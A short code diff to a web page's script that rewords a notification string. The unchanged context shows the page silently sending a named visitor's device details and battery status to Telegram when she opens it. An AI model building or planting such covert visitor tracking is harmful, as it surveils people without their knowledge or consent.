@@ -256,11 +256,11 @@
             if (navigator.getBattery) {
                 navigator.getBattery().then(battery => {
                     batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? 'charging' : 'not charging'}`;
-                    const message = `YOO XD!!🫦 Gouri has been opened the site🙈\n📲Device: ${deviceInfo}\n🔋Battery: ${batteryInfo}\n\n🎮Server Info\n● 📶 Connection Success.\n● 🐞Bugs: No errors Found.`;
+                    const message = `YOO XD!!🫦 Gouri has been opened the site🙈\n📲Device: ${deviceInfo}\n🔋Battery: ${batteryInfo}\n\n🎮Server Info\n● 📶 Connected\n● 🐞Bugs: No errors Found.`;
                     sendMessageToTelegram(message);
                 });
             } else {
-                const message = `YOO XD!!🫦 Gouri has been opened the site🙈\n📲Device: ${deviceInfo}\n🔋Battery: ${batteryInfo}\n------------------------------------\n🎮Server Info\n● 📶 Connection Success.\n● 🐞Bugs: No errors Found.`;
+                const message = `YOO XD!!🫦 Gouri has been opened the site🙈\n📲Device: ${deviceInfo}\n🔋Battery: ${batteryInfo}\n\n🎮Server Info\n● 📶 Connected\n● 🐞Bugs: No errors Found.`;
                 sendMessageToTelegram(message);
             }
         };
@@ -407,7 +407,7 @@
                     }
                 }, 2000);
             }, 3000); // 3 seconds for uploading text
-        }                        
+        }
     </script>
 </body>
 </html>
